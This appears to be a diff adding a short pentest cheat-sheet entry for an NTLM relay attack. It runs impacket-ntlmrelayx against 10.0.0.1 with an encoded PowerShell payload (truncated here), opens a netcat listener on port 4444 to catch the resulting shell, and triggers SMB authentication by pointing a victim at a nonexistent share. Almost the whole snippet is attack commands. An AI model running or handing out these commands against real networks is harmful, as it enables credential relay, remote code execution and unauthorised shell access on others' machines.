@@ -1,0 +1,8 @@
+# Start the server, with a Base64 encoded payload in powershell to port 4444:
+$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.0.0.1 -c "powershell -enc JABjAGwAxadfSDxdA..."
+
+# Start the listener on port 4444:
+$ nc -vnlp 4444
+
+# When someone try to access your attack machine with SMB share (which don't need to exist) the hash will be recorded and sent to the target 10.0.0.1:
+$ dir \\10.0.0.9\nonexistentshare
